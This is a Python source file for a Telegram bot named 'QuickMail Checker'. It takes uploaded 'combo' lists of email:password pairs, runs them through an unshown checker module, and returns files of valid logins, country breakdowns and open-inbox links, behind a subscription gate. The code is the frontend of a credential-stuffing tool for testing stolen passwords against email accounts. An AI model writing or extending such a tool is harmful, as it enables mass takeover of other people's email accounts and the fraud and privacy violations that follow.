# language: Python, file: main.py
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)
import checker, reports, db

TOKEN = os.environ["TG_TOKEN"]
SUB_CHECK = lambda uid: True

app = Application.builder().token(TOKEN).build()
DB = None

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("📧 Full Checker", callback_data="mode:mix")],
          [InlineKeyboardButton("⚡ Quick Check", callback_data="quick")]]
    await u.message.reply_text("⚡ QuickMail Checker\n\nPick a mode:",
                               reply_markup=InlineKeyboardMarkup(kb))

async def on_btn(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    await q.answer()
    data = q.data
    if data.startswith("mode:"):
        mode = data.split(":")[1]
        c.user_data["mode"] = mode
        await q.message.reply_text("Upload combo .txt (email:password per line).")
    elif data == "quick":
        c.user_data["quick"] = True
        await q.message.reply_text("Send one combo: email:password")

async def on_doc(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not SUB_CHECK(u.effective_user.id):
        await u.message.reply_text("🔒 Subscription required.")
        return
    f = await u.message.document.get_file()
    raw = await f.download_as_bytearray()
    combos = [l.strip() for l in raw.decode(errors="ignore").splitlines() if ":" in l]
    mode = c.user_data.get("mode", "mix")
    await u.message.reply_text(f"⚡ Running {len(combos)} combos")

    async def progress(done, total, valid):
        await u.message.reply_text(f"Progress {done}/{total} | valid {valid}")

    valid, fails = await checker.run(combos, mode=mode, on_progress=progress)
    if not valid:
        await u.message.reply_text(f"✅ Done. Valid: 0 | Fail: {len(fails)}")
        return
    p1 = reports.write_all_valid(valid)
    p2 = reports.write_countries(valid)
    p3 = reports.open_inbox_links(valid)
    await u.message.reply_document(open(p1, "rb"), filename="all_valid.txt")
    await u.message.reply_document(open(p2, "rb"), filename=os.path.basename(p2))
    await u.message.reply_document(open(p3, "rb"), filename="open_inbox.txt")
    await u.message.reply_text(f"✅ Done. Valid: {len(valid)} | Fail: {len(fails)}")

async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.user_data.get("quick") and ":" in u.message.text:
        valid, _ = await checker.run([u.message.text.strip()], mode="mix")
        if valid:
            v = valid[0]
            await u.message.reply_text(
                f"✅ VALID\n{v['email']}:{v['password']}\n"
                f"Host: {v.get('host','?')}")
        else:
            await u.message.reply_text("❌ Invalid.")

async def post_init(a: Application):
    global DB
    DB = await db.init()

app.post_init = post_init
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(on_btn))
app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

if __name__ == "__main__":
    app.run_polling()
